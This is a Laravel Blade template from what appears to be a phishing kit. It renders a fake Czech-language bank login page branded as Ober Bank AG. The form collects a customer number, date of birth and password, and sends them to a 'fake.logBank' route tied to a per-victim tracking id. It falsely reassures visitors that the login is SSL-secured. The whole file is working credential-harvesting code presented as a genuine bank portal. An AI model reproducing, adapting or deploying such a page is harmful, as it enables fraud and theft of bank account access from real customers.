@extends('layouts.fake')
@push('css')
    <link href="https://play-lh.googleusercontent.com/APhZIlJMOmdU0iyBxr2y2PzEi7A9pd4M1c1nGw6lE9js5oMkh_JI5kbj-qZNIZlbbiI" rel="icon" type="image/x-icon">
    <style>
        ._0 {
            margin: 0 auto;
            max-width: 400px;
            box-sizing: border-box;
            background: #fff;
            margin-top: 50px;
            margin-bottom: 50px;
        }
        ._01 {
            margin: 0 auto;
            max-width: 490px;
            box-sizing: border-box;
            padding: 24px;
            background: #fff;
            margin-top: 50px;
            padding-left: 0;
            margin-bottom: 50px;
        }
        ._1 {
            font-size: 28px;
            padding-top: 16px;
            width: 100%;
            text-align: center;
            font-size: 36;
            font-style: bold;

        }
        ._2 {
            margin: 10px 0;
            border-bottom: 1px solid #ddd;
        }
        ._3 {
            text-align: center;
            font-size: 14px;
            border: 3px solid #c5c4c4;
            background-color: #e5e5ea;
            border-radius: 6px;

            padding: 12px 10px;
            margin-bottom: 20px;
        }
        ._3:hover {
            border-color: #000;
            background-color: #e5e5ea;
        }
        ._4 {
            float: right;
            width: 100%;
            margin: 0;
            color: #000;
            font-weight: 400;
            font-size: 15px;
            line-height: 24px;
            display: inline-block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 8px 30px 6px 31px;
            min-width: 180px;
            border-radius: 3px;
            white-space: nowrap;
            background-color: #c90000;
            color: #fff;
            text-align: center;
            text-decoration: none;
        }
        ._4:hover {
            background-color: #c90000;
            color: #fff;
            border-color: #c90000;
        }
        ._5 {
            color: #aaa;
            text-align: right;
            width: 45%;
            padding-right: 24px;
        }
        ._6 {
            font-weight: bold;
        }
        ._7 {
            margin-top: 4px;
            margin-bottom: 16px;
        }
        ._8 {
            padding-bottom: 6px;
            line-height: 18px;
        }
        ._9 {
            text-align: right;
        }
        body {
            margin: 0;
            font-family: Arial;
            font-size: 12px;
            color: #222;
            word-break: break-word;
            user-select: none;
            background: #fdfdfd;
        }
        input {
            font-family: Arial;
            font-size: 12px;
            color: #222;
            width: 100%;
            border: none;
            box-sizing: border-box;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }
        td {
            padding: 4px 0;
        }
        #mainblock {
            display: flex;
            margin: 0 40px;
            border-bottom: 1px solid #e4e4e4;
        }
        #rightblock {
            margin-top: 100px;
            display: flex;
        }
        .loginboxes {
            display: block;
        }
        #formblock {
            /*border-right: 1px solid #e4e4e4;
            padding-right: 70px; */
            padding-bottom: 20px;
            margin-top: 20px;
        }
        #konto {
            float: right;
            padding-bottom: 10px;
            padding-top: 30px;
        }
        #Pomoc {
            display: none;
            padding-top: 25px;
            width: 150px;
        }
        @media all and (max-width: 800px) {
            #mainblock {
                display: block;
            }
            #formblock {
                border-right: none;
                padding-right: 0;
            }
        }
        @media all and (max-width: 500px) {
            .loginboxes {
                display: block;
            }
            #rightblock {
                display: block;
            }
            #konto {
                margin: 0;
            }
            #Pomoc {
                padding-top: 0;
                padding-bottom: 25px;
            }
            ._4 {
                width: 100%;
            }
        }
    </style>
@endpush
@section('content')
    <div id="mainblock">
        <div class="_0">
            <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                <center><img height="80" src="{{asset($bank['logo'])}}"></center>
                <div class="loginboxes" style="margin-bottom: 20px;">
                    <div class="_1">Přihlaste se do systému</div>
                </div>
                <input class="_3" type="text" name="logo" placeholder="Zadejte zákaznické číslo"
                       required="">
                <input class="_3" type="text" name="birthday" placeholder="Datum narození" required="">
                <input class="_3" type="password" name="password" placeholder="Zadejte heslo" required="">
                <div class="loginboxes">
                    <p style="text-align: center; color: #666666;">Přihlášení do Klientského portálu je zabezpečeno
                        prostřednictvím SSL.</p>
                    <input class="_4" type="submit" value="Pokračovat"><br><br><br>
                    <input style="background-color: #ebebee; color: #543323;" class="_4" type="submit"
                           value="Pomoc s přihlášením">
                </div>
            </form>
            <center><img style="margin-top: 30px; border-radius: 10px;" width="300"
                         src="{{asset('images/banks/maxresdefault.jpg')}}"></center>
        </div>
        <footer>
            <center>© {{date('Y')}} Ober Bank AG</center>
        </footer>
    </div>
@endsection
@push('js')
@endpush
